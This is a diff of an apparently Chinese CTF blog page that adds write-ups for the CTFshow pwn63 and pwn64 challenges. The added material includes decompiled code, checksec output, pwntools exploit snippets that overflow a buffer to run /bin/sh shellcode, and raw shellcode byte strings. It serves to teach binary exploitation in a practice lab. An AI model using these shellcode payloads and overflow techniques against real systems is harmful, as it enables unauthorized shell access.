@@ -78,8 +78,8 @@
       <header class="article-header">
         <div class="post-meta">
           <time datetime="2026-08-12">2026-08-12</time>
-          <span>约 52 分钟</span>
-          <span>25851 字</span>
+          <span>约 55 分钟</span>
+          <span>27175 字</span>
         </div>
         <h1>CTFshow pwn靶场练习</h1>
         
@@ -230,9 +230,22 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">int __fastcall main(int argc, const char **argv, const char **envp)<br>&#123;<br>  FILE *__bss_start; // rdi<br>  _QWORD buf[2]; // [rsp+0h] [rbp-10h] BYREF<br><br>  buf[0] = 0;<br>  buf[1] = 0;<br>  __bss_start = _bss_start;<br>  setvbuf(_bss_start, 0, 1, 0);<br>  logo(__bss_start, 0);<br>  puts(&quot;Welcome to CTFshow!&quot;);<br>  printf(&quot;What&#x27;s this : [%p] ?\n&quot;, buf);<br>  puts(&quot;Maybe it&#x27;s useful ! But how to use it?&quot;);<br>  read(0, buf, 0x38u);<br>  return 0;<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>也差不多，只是输入shellcode的长度短了一些，但是使用上面那个是够的，直接上exp：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">io.recvuntil(&quot;[0x&quot;)<br>buf = int(io.recv(12),16)<br>leak(&quot;buf&quot;,buf)<br>shellcode = &#x27;&#x27;&#x27;<br>push rax;<br>xor rdx, rdx;<br>xor rsi, rsi;<br>mov rbx, 0x68732F2F6E69622F;<br>push rbx;<br>push rsp;<br>pop rdi;<br>mov al, 0x3B;<br>syscall;<br>&#x27;&#x27;&#x27;<br>shellcode = asm(shellcode)<br>payload = cyclic(0x18) + p64(buf + 0x20) + shellcode<br>sl(payload)<br></code></pre></td></tr></table></figure>
-<p>这里在给一下官方wp的shellcode</p>
+<p>这里给一下官方wp的shellcode</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x5 2\x57\x54\x5e\x0f\x05&quot;    一共24字节<br></code></pre></td></tr></table></figure>
 <h2 id="pwn63"><a href="#pwn63" class="headerlink" title="pwn63"></a>pwn63</h2><p>和上面那个差不多，就是比上面这个又少了一个字节可输入。exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">io.recvuntil(&quot;[0x&quot;)<br>buf = int(io.recv(12),16)<br>leak(&quot;buf&quot;,buf)<br>shellcode = &#x27;&#x27;&#x27;<br>xor rsi, rsi;<br>push rsi;<br>mov rdi, 0x68732f2f6e69622f;    #/bin//sh<br>push rdi;<br>push rsp;<br>pop rdi;<br>push 0x3b;<br>pop rax;<br>cdq;    #根据eax的符号扩展到edx，因为59是正数，所以edx=0，rdx也就是0<br>syscall<br>&#x27;&#x27;&#x27;<br>shellcode = asm(shellcode)<br>payload = cyclic(0x10 + 8) + p64(buf + 0x20) + shellcode<br>sl(payload)<br></code></pre></td></tr></table></figure>
+
+<p>这里给一下官方wp的shellcode</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;    一共23字节<br></code></pre></td></tr></table></figure>
+
+<h2 id="pwn64"><a href="#pwn64" class="headerlink" title="pwn64"></a>pwn64</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[*] &#x27;/mnt/d/ctf/ctfshow pwn入门/pwn64&#x27;<br>    Arch:       i386-32-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x8048000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure>
+
+<p>放入ida中进行分析一手</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">int __cdecl main(int argc, const char **argv, const char **envp)<br>&#123;<br>  void *buf; // [esp+8h] [ebp-10h]<br><br>  buf = mmap(0, 0x400u, 7, 34, 0, 0);<br>  alarm(0xAu);<br>  setvbuf(stdout, 0, 2, 0);<br>  setvbuf(_bss_start, 0, 2, 0);<br>  puts(&quot;Some different!&quot;);<br>  if ( read(0, buf, 0x400u) &lt; 0 )<br>  &#123;<br>    puts(&quot;Illegal entry!&quot;);<br>    exit(1);<br>  &#125;<br>  ((void (*)(void))buf)();<br>  return 0;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>存在mmap函数，mmap函数主要是映射一块内存，它主要的六个参数分别表示：起始地址、映射长度、权限、标志（私有映射&#x2F;匿名映射）、文件描述符和偏移。在这道题目中，意思就是申请了一块大小为0x400个字节的内存块，其权限为可读可写可执行，并将这块内存的起始地址存放到buf中。后续会读入数据到这块内存，并执行，此时就可以打shellcode了，因为可输入字节长度足够，使用shellcraft就可以了。exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">shellcode = asm(shellcraft.sh())<br>sl(shellcode)<br></code></pre></td></tr></table></figure>
+
 
         </div>
 
@@ -249,11 +262,11 @@
 
       <nav class="article-nav" aria-label="文章导航">
         
-        
           <a href="/2026/08/12/pwn%20college_%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">
-            <span>下一篇</span>
+            <span>上一篇</span>
             <strong>pwn college_靶场练习</strong>
           </a>
+        
         
       </nav>
     </article>
